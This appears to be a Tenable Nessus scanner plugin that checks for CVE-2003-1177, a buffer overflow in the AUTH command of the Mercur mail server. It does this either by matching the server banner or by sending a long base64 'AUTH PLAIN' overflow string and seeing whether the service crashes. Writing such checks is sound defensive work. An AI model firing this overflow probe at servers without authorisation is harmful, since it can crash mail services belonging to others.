#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(11910);
 script_version("$Revision: 1.12 $");
 script_cve_id("CVE-2003-1177");
 script_bugtraq_id(8861, 8889);
 script_xref(name:"OSVDB", value:"15386");

# if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2003-A-");

 script_name(english:"Mercur Mailserver POP3 Server AUTH Command Remote Overflow");

 script_set_attribute(attribute:"synopsis", value:
"The remote mail server is prone to a buffer overflow attack." );
 script_set_attribute(attribute:"description", value:
"The remote Atrium Mercur SMTP server (mail server) seems to be
vulnerable to a remote buffer overflow.  Successful exploitation of
this vulnerability would give a remote attacker administrative access
to the mail server and access to potentially confidential data." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2003-q4/1459.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.atrium-software.com/mercur/mercur_e.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to MERCUR Mailserver 4.2 SP3a or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );
script_end_attributes();


 script_summary(english:"Checks for the Mercur remote buffer overflow");
 script_category(ACT_MIXED_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english:"Windows");
 script_dependencie("find_service1.nasl");
 script_require_ports("Services/smtp", 25);
 exit(0);
}


# start script code

include("global_settings.inc");
include("smtp_func.inc");

if (report_paranoia < 2) exit(0);


port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (!get_port_state(port)) exit(0);


if ( safe_checks() )
{
 banner = get_smtp_banner(port:port);
 if ( ! banner ) exit(0);

 if(egrep(pattern:"^220.*MERCUR SMTP-Server .v([0-3]\.|4\.0?([01]\.|2\.0))",
	  string:banner))security_hole(port);
 exit(0);
}

# this test string provided by
# Kostya KORTCHINSKY on FD mailing list at netsys

req = string("AUTH PLAIN kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ");


banner = get_smtp_banner(port:port);
if ("MERCURE SMTP-Server" >!< banner)
  exit (0);

soc=open_sock_tcp(port);
if (!soc) exit(0);
send (socket:soc, data:req);     
close(soc);
soc = open_sock_tcp(port);
if (!soc) security_hole(port);
exit(0);












